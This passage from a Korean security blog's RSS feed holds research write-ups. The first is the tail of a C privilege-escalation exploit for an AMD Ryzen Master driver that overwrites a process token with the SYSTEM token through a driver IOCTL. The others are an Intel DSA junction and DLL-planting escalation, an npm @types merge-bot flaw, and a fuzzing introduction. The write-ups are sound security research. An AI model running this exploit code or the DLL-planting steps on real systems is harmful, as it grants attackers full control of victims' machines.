class="hljs-built_in">memcpy</span>(cmd_page_buff, results, modulus);    <span class="hljs-built_in">memcpy</span>(cmd_page_buff + modulus, (<span class="hljs-keyword">void</span>*)&amp;system_token_value, <span class="hljs-number">0x8</span>);        DWORD num_of_bytes = modulus + <span class="hljs-number">0x8</span>;    BYTE input_buff2[<span class="hljs-number">0x1000</span>] = { <span class="hljs-number">0</span>, };    <span class="hljs-built_in">memcpy</span>(input_buff2, (<span class="hljs-keyword">void</span>*)&amp;cmd_page, <span class="hljs-number">0x8</span>);  <span class="hljs-comment">//Physical address</span>    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0x8</span>, (<span class="hljs-keyword">void</span>*)&amp;num_of_bytes, <span class="hljs-number">0x4</span>); <span class="hljs-comment">// Number of bytes</span>    <span class="hljs-built_in">memcpy</span>(input_buff2 + <span class="hljs-number">0xc</span>, cmd_page_buff, modulus + <span class="hljs-number">0x8</span>); <span class="hljs-comment">// Address to be copied</span>    DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    HANDLE dHandle;    dHandle = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);    PROC_DATA proc_data;    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    proc_data = read_memory(dHandle);    parse_proc(proc_data, dHandle);    <span class="hljs-keyword">if</span> (system_token_value == <span class="hljs-number">0</span> || cmd_token_addr == <span class="hljs-number">0</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get cmd.exe/SYSTEM token Fail\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] cmd.exe token address: 0x%llx\n&quot;</span>, cmd_token_addr);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] Overwriting token with value: 0x%llx\n&quot;</span>, system_token_value);    overwrite_token(dHandle);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[&gt;] Complete\n&quot;</span>);    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xAE30;&#xCD08;&#xAC00; &#xBD80;&#xC2E4;&#xD574;&#xC11C; &#xBB3C;&#xB9AC;&#xBA54;&#xBAA8;&#xB9AC; &#x2194; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774; &#xB9E4;&#xD551; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xB2E4;&#xC2DC; &#xC774;&#xD574;&#xD558;&#xB290;&#xB77C; &#xACE0;&#xC0DD;&#xC744; &#xC880; &#xD55C; &#xAC70; &#xB9D0;&#xACE0;&#xB294;&#x2026; &#xBB34;&#xB09C;&#xD558;&#xAC8C; &#xBD84;&#xC11D;&#xD588;&#xB358; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xC5ED;&#xC2DC; &#xACF5;&#xBD80; &#xD55C;&#xBC88; &#xD560; &#xB54C; &#xC81C;&#xB300;&#xB85C; &#xD574;&#xB194;&#xC57C; &#xB098;&#xC911;&#xC5D0; &#xACE0;&#xC0DD;&#xC744; &#xC548;&#xD558;&#xC9C0;&#x3160;&#x3160;</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778;(?) &#xC81C;&#xBAA9;&#xC758; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC548;&#xB155;~</p><blockquote><p>&#xC624;&#xB958; &#xBC0F; &#xC624;&#xD0C0;&#xC9C0;&#xC801;&#xC740; &#xB05D;&#xC5C6;&#xB294; &#xC0BD;&#xC9C8;&#xC5D0; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://h0mbre.github.io/RyzenMaster_CVE/">https://h0mbre.github.io/RyzenMaster_CVE/</a></li><li><a href="https://h0mbre.github.io/atillk64_exploit/">https://h0mbre.github.io/atillk64_exploit/</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace</a></li><li><a href="https://movaxbx.ru/2020/10/14/cve-2020-12928-exploit-proof-of-concept-privilege-escalation-in-amd-ryzen-master-amdryzenmasterdriver-sys/">https://movaxbx.ru/2020/10/14/cve-2020-12928-exploit-proof-of-concept-privilege-escalation-in-amd-ryzen-master-amdryzenmasterdriver-sys/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-driver/">windows driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/third-party-driver-exploitation/">third-party driver exploitation</category>
      
      <category domain="https://hackyboiz.github.io/tags/amd/">amd</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-0090: INTEL 드라이버 및 지원 도우미의 권한상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/08/10/l0ch/2021-08-10/</link>
      <guid>https://hackyboiz.github.io/2021/08/10/l0ch/2021-08-10/</guid>
      <pubDate>Tue, 10 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://bohops.com/2021/08/07/cve-2021-0090-intel-driver</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://bohops.com/2021/08/07/cve-2021-0090-intel-driver-support-assistant-dsa-elevation-of-privilege-eop/">CVE-2021-0090: INTEL DRIVER &amp; SUPPORT ASSISTANT (DSA) ELEVATION OF PRIVILEGE (EOP)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Intel DSA(Driver &amp; Support Assistant)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC778;&#xD154; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC81C;&#xACF5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Intel Driver &amp; Support Assistant (DSA)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD8C;&#xD55C;&#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xB294; &#xC138;&#xBD80; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>DSA &#xD2B8;&#xB808;&#xC774; &#xC544;&#xC774;&#xCF58;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC124;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>&#xAE30;&#xBCF8;&#xAC12;&#xC740; <code>C:\ProgramData\Intel\DSA</code> &#xC774;&#xBA70; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xBA74; DSA &#xC11C;&#xBE44;&#xC2A4;&#xC778; <code>DSAService.exe</code>&#xAC00; &#xAE30;&#xC874; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC0C8;&#xB85C; &#xC124;&#xC815;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD558;&#xC704; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/10/l0ch/2021-08-10/1.png" alt></p></li></ul></li><li><p>&#xACBD;&#xB85C;&#xB97C; <code>c:\test</code> &#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xB4A4; &#xD558;&#xC704; <code>Downloads</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; <code>c:\windows\System32</code> &#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; Directory Junction&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/10/l0ch/2021-08-10/2.png" alt></p></li><li><p><code>Download</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; payload&#xB97C; &#xD3EC;&#xD568;&#xD574; &#xCEF4;&#xD30C;&#xC77C;&#xD55C; <code>ualapi.dll</code> &#xD30C;&#xC77C;&#xC744; &#xBC30;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>ualapi.dll</code>&#xC740; Windows Spooler &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC758;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xC2DC;&#xC791; &#xC2DC;&#xAC04;(&#xC7AC;&#xBD80;&#xD305; &#xD6C4;)&#xC5D0; &#xB85C;&#xB4DC;&#xB429;&#xB2C8;&#xB2E4;. </li></ul></li><li><p>&#xB2E4;&#xC2DC; DSA&#xC758; &#xC124;&#xC815;&#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; <code>C:\temp</code> &#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>DSA &#xC11C;&#xBE44;&#xC2A4;&#xAC00; <code>c:\test</code>&#xC5D0;&#xC11C; <code>c:\temp</code>&#xB85C; &#xD558;&#xC704; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC62E;&#xAE30;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Junction&#xC73C;&#xB85C; &#xC778;&#xD574;  <code>Download</code>&#xC758; <code>ualapi.dll</code>&#xC744; <code>c:\windows\System32</code> &#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xCF1C; &#xAE30;&#xC874;&#xC758; &#xC815;&#xC0C1;&#xC801;&#xC778; <code>ualapi.dll</code>&#xC744; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC7AC;&#xBD80;&#xD305;&#xD558;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xD30C;&#xC77C;&#xB85C; &#xB300;&#xCCB4;&#xB41C; <code>ualapi.dll</code>&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2020&#xB144; 10&#xC6D4; &#xC81C;&#xBCF4;&#xB418;&#xC5B4; 2021&#xB144; 6&#xC6D4;&#xC5D0; &#xC778;&#xD154;&#xC774; &#xD328;&#xCE58;&#xB97C; &#xB9B4;&#xB9AC;&#xC988;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/intel/">intel</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/10/l0ch/2021-08-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Tampering with arbitrary packages in @types scope of npm</title>
      <link>https://hackyboiz.github.io/2021/08/09/fabu1ous/2021-08-09/</link>
      <guid>https://hackyboiz.github.io/2021/08/09/fabu1ous/2021-08-09/</guid>
      <pubDate>Mon, 09 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.ryotak.me/post/definitelytyped-tamper-with-a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ryotak.me/post/definitelytyped-tamper-with-arbitrary-packages-en/">Tampering with arbitrary packages in @types scope of npm</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p><a href="https://github.com/DefinitelyTyped">Definitely typed</a></p><p>dt-mergebot</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Definitely Typed&#xC758; pull request &#xAD00;&#xB9AC; bot&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Definitely typed&#xB294; @type scope &#xC18D; npm &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB85C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC545;&#xC131; pull request&#xB97C; merge &#xD574; @type scope&#xC18D; &#xC784;&#xC758;&#xC758; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; dt-mergebot&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>pull request&#xB85C;&#xBD80;&#xD130; &#xBCC0;&#xD654;&#xB41C;(changes) &#xD30C;&#xC77C;&#xC744; fetch</li><li>&#xD328;&#xD0A4;&#xC9C0;&#xC5D0; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;</li><li>&#xD328;&#xD0A4;&#xC9C0; &#xAD00;&#xB9AC;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xACE0;</li><li>&#xD328;&#xD0A4;&#xC9C0; &#xAD00;&#xB9AC;&#xC790;&#xAC00; &#xC2B9;&#xC778;&#xD558;&#xBA74; &#xD574;&#xB2F9; pull request&#xB294; merge &#xAD8C;&#xD55C; &#xBD80;&#xC5EC;</li><li>pull request &#xC791;&#xC131;&#xC790;&#xAC00; <code>Ready to merge</code> &#xCF54;&#xBA58;&#xD2B8;&#xB97C; &#xB2EC;&#xBA74; merge &#xC218;&#xD589;</li></ol><p>&#xBB38;&#xC81C;&#xB294; dt-mergebot&#xC774; pull request&#xC758; merge&#xAD8C;&#xD55C;&#xC744; &#xACC4;&#xC0B0;&#xD560; &#xB54C; &#xCCAB; 100&#xAC1C;&#xC758; file&#xB9CC;&#xC744; fetch &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 101&#xAC1C; &#xC774;&#xC0C1;&#xC758; changes&#xAC00; &#xC788;&#xB294; pull request&#xB294; 101 &#xBC88;&#xC9F8; &#xD30C;&#xC77C;&#xBD80;&#xD130; &#xAD8C;&#xD55C; &#xAC80;&#xC0AC; &#xB300;&#xC0C1;&#xC5D0;&#xC11C; &#xC81C;&#xC678;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs GraphQL">query PR($pr_number: Int!) {    repository(owner: &quot;DefinitelyTyped&quot;, name: &quot;DefinitelyTyped&quot;) {      id      pullRequest(number: $pr_number) {        [...]        files(first: 100) {          totalCount          nodes {            path            additions            deletions          }        }        [...]      }   }}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/npm/">npm</category>
      
      <category domain="https://hackyboiz.github.io/tags/package/">package</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/09/fabu1ous/2021-08-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 퍼징 교양 수업 fuzz 101 - part1</title>
      <link>https://hackyboiz.github.io/2021/08/08/fabu1ous/fuzz-1/</link>
      <guid>https://hackyboiz.github.io/2021/08/08/fabu1ous/fuzz-1/</guid>
      <pubDate>Sun, 08 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;a href=&quot;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&quot;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9B</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; Fabu1ous&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC00; &#xCD5C;&#xADFC;&#xC5D0; &#xC62C;&#xB9B0; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xBAA8;&#xB450; &#xD37C;&#xC800;&#xC5D0; &#xB300;&#xD55C; &#xAE00;&#xC774;&#xC5C8;&#xC8E0;? &#xD37C;&#xC9D5;&#xC758; &#xAC1C;&#xB150;&#xC740; &#xB9E4;&#xC6B0; &#xB2E8;&#xC21C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9; &#xAE30;&#xC220; &#xC911; &#xB192;&#xC740; &#xC778;&#xAE30;&#xB97C; &#xC720;&#xC9C0; &#xC911;&#xC774;&#xBA70; &#xAFB8;&#xC900;&#xD788; &#xC5F0;&#xAD6C;&#xB418;&#xB294; &#xBD84;&#xC57C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xAC1C;&#xB150;&#xB9CC; &#xB2E8;&#xC21C;&#xD560; &#xBFD0; &#xD37C;&#xC9D5;&#xC758; &#xD6A8;&#xC728; &#xD5A5;&#xC0C1;&#xC744; &#xC704;&#xD55C; &#xC5F0;&#xAD6C;&#xB4E4;&#xC744; &#xD558;&#xB098;&#xD558;&#xB098; &#xC0B4;&#xD3B4;&#xBCF8;&#xB2E4;&#xBA74; &#xB300;&#xB2E8;&#xD788; &#xBC29;&#xB300;&#xD558;&#xACE0; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD37C;&#xC9D5; &#xBD84;&#xC57C;&#xC758; &#xACF5;&#xBD80;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB531; &#xC54C;&#xB9DE;&#xC740; &#xB17C;&#xBB38;&#xC774; &#xC788;&#xC5B4; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC120; &#xD37C;&#xC9D5;&#xC758; &#xAE30;&#xBCF8; &#xAC1C;&#xB150;&#xACFC; &#xC6A9;&#xC5B4;, &#xADF8;&#xB9AC;&#xACE0; &#xD37C;&#xC800;&#xC758; &#xBD84;&#xB958;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://arxiv.org/pdf/1812.00140.pdf">https://arxiv.org/pdf/1812.00140.pdf</a></p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>1990&#xB144;&#xB300; fuzzing&#xC774;&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xAC00; &#xCC98;&#xC74C; &#xC0AC;&#xC6A9;&#xB41C; &#xC774;&#xD6C4;, &#xD37C;&#xC9D5;&#xC740; exploit generation&#xACFC; penetration testing &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9;&#xBC95;&#xC5D0; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD788; Attacker&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB9CC;&#xC774; &#xC544;&#xB2C8;&#xB77C; Defender&#xC758; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C; &#xB2E8;&#xACC4;&#xBD80;&#xD130; &#xD37C;&#xC9D5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC; &#xD37C;&#xC9D5; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0;&#xB294; &#xC815;&#xB9D0; &#xBC29;&#xB300;&#xD55C;&#xB370;, &#xAE43;&#xD5D9;&#xC5D0;&#xB9CC; &#xD37C;&#xC9D5;&#xC5D0; &#xB300;&#xD55C; &#xD37C;&#xBE14;&#xB9AD; &#xB808;&#xD3EC;&#xAC00; &#xCC9C; &#xAC1C; &#xC774;&#xC0C1; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/08/fabu1ous/fuzz-1/2.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xBC29;&#xB300;&#xD55C; &#xBD84;&#xC57C;&#xB97C; &#xD558;&#xB098;&#xD558;&#xB098; &#xB530;&#xB77C;&#xAC00;&#xAE30; &#xC27D;&#xC9C0; &#xC54A;&#xC744;&#xBFD0;&#xB354;&#xB7EC; &#xAC01; &#xD37C;&#xC800;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xAC70;&#xB098; &#xD5A5;&#xC0C1;&#xB41C; &#xAE30;&#xB2A5; &#xB4F1;&#xC744; &#xB73B;&#xD558;&#xB294; &#xC6A9;&#xC5B4;&#xB4E4;&#xC774; &#xD558;&#xB098;&#xB85C; &#xD655;&#xB9BD;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xBA74; AFL&#xC758; &#x201C;test case minimization&#x201D;&#xACFC; funfuzz&#xC758; &#x201C;test case reduction&#x201D;&#xC758; &#xACBD;&#xC6B0; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xC11C;&#xB85C; &#xB2E4;&#xB974;&#xAC8C; &#xBD80;&#xB974;&#xACE0; &#xC788;&#xC8E0;. &#xB610;&#xD55C; BFF&#xC758; &#x201C;crash minimization&#x201D;&#xACFC; &#xAC19;&#xC774; &#xC774;&#xB984;&#xC740; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC791;&#xC774; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7A5;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xBCFC; &#xB54C; &#xC774;&#xB7F0; &#xD604;&#xC0C1;&#xC740; &#xD37C;&#xC9D5; &#xC5F0;&#xAD6C;&#xC758; &#xC7A5;&#xC560;&#xBB3C;&#xC774; &#xB420; &#xAC83;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD574;, &#xBCF8; &#xB17C;&#xBB38;&#xC744; &#xD1B5;&#xD574; &#xD37C;&#xC9D5;&#xC744; &#xBD84;&#xB958;&#xD558;&#xACE0; &#xD1B5;&#xC77C;&#xB41C; &#xBAA8;&#xB378;&#xC744; &#xC81C;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="2-Systemization-Taxonomy-Test-Programs"><a href="#2-Systemization-Taxonomy-Test-Programs" class="headerlink" title="2. Systemization, Taxonomy, Test Programs"></a>2. Systemization, Taxonomy, Test Programs</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/3.png" alt></p><blockquote><p>generates a stream of random characters to be consumed by a target program</p><p>-Miller-</p></blockquote><p>&#x201C;fuzz&#x201D;&#xB77C;&#xB294; &#xB2E8;&#xC5B4;&#xB294; 1990&#xB144; &#xCC98;&#xC74C; &#xC704;&#xC640; &#xAC19;&#xC740; &#xC758;&#xBBF8;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4;&#xB85C; fuzz&#xC640; fuzzing&#xC758; &#xAC1C;&#xB150; &#xBC0F; &#xB3D9;&#xC791;&#xC774; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xD30C;&#xC0DD;&#xB418;&#xC5B4; &#xD63C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <s>&#xC77C;&#xB809;&#xAE30;&#xD0C0; &#xC774;&#xD399;&#xD130; &#xD398;&#xB2EC;&#xC911;&#xC5D0; fuzz&#xB77C;&#xB294; &#xB188;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</s></p><ul><li><p>dynamic symbolic execution</p></li><li><p>grammarbased test case generation</p></li><li><p>permission testing</p></li><li><p>behavioral testing</p></li><li><p>complexity testing</p></li><li><p>kernel testing</p></li><li><p>representation dependence testing</p></li><li><p>function detection</p></li><li><p>robustness evaluation</p></li><li><p>exploit development</p></li><li><p>GUI testing</p></li><li><p>signature generation</p></li><li><p>penetration testing</p></li></ul><h2 id="2-1-fuzzing-amp-fuzz-testing"><a href="#2-1-fuzzing-amp-fuzz-testing" class="headerlink" title="2.1 fuzzing &amp; fuzz testing"></a>2.1 fuzzing &amp; fuzz testing</h2><p>&#xB530;&#xB77C;&#xC11C; &#xC880; &#xB354; &#xCCB4;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6A9;&#xC5B4;&#xB97C; &#xBA3C;&#xC800; 